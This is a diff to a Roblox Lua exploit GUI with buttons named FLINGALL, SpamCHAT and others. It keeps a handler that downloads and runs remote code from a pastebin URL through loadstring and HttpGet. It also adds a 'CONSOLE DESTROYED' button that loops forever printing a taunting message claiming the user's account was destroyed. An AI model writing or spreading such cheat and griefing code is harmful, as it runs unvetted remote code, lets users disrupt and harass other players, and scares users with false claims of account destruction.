@@ -13,6 +13,7 @@ local SpamCHAT = Instance.new("TextButton")
 local SpamTEXT = Instance.new("TextButton")
 local CREDIT = Instance.new("TextButton")
 local IQOBBY = Instance.new("TextButton")
+local CONSOLEDES = Instance.new("TextButton")
 local ENERGIZE = Instance.new("TextButton")
 local IY = Instance.new("TextButton")
 local OH = Instance.new("TextButton")
@@ -84,19 +85,7 @@ FLINGALL.TextScaled = true
 FLINGALL.TextSize = 14.000
 FLINGALL.TextWrapped = true
 FLINGALL.MouseButton1Down:connect(function()
-FA = up.MouseEnter:connect(function()
-		while FA do
-			wait()
-
 loadstring(game:HttpGet("https://pastebin.com/raw/0LLBHBq4"))()
-end
-	end)
-end)
-FLINGALL.MouseLeave:connect(function()
-	if FA then
-		FA:Disconnect()
-		FA = nil
-	end
 end)
 SpamCHAT.Parent = Frame
 SpamCHAT.BackgroundColor3 = Color3.fromRGB(226, 155, 64)
@@ -200,6 +189,27 @@ IQOBBY.TextWrapped = true
 IQOBBY.MouseButton1Down:connect(function()
 game:GetService("TeleportService"):Teleport(12805830692)
 wait()
+end)
+CONSOLEDES.Parent = Frame
+CONSOLEDES.BackgroundColor3 = Color3.fromRGB(226, 155, 64)
+CONSOLEDES.BorderColor3 = Color3.fromRGB(0, 0, 0)
+CONSOLEDES.BorderSizePixel = 3
+CONSOLEDES.Position = UDim2.new(-0.40, 0, 0.65, 0)
+CONSOLEDES.Rotation = 25
+CONSOLEDES.Size = UDim2.new(0, 100, 0, 25)
+CONSOLEDES.Font = Enum.Font.SourceSans
+CONSOLEDES.Text = "CONSOLE DESTROYED"
+CONSOLEDES.TextColor3 = Color3.fromRGB(242, 243, 243)
+CONSOLEDES.TextScaled = true
+CONSOLEDES.TextSize = 14.000
+CONSOLEDES.TextWrapped = true
+CONSOLEDES.MouseButton1Down:connect(function()
+game.StarterGui:SetCore("DevConsoleVisible", true)
+wait(0)
+while wait(0) do
+warn("BossJKLO HAS DESTROYED YOUR Account HAHAHAHA!$!$!$")
+print("BossJKLO HAS DESTROYED YOUR Account HAHAHAHA!$!$!$")
+end
 end)
 ENERGIZE.Parent = Frame
 ENERGIZE.BackgroundColor3 = Color3.fromRGB(226, 155, 64)
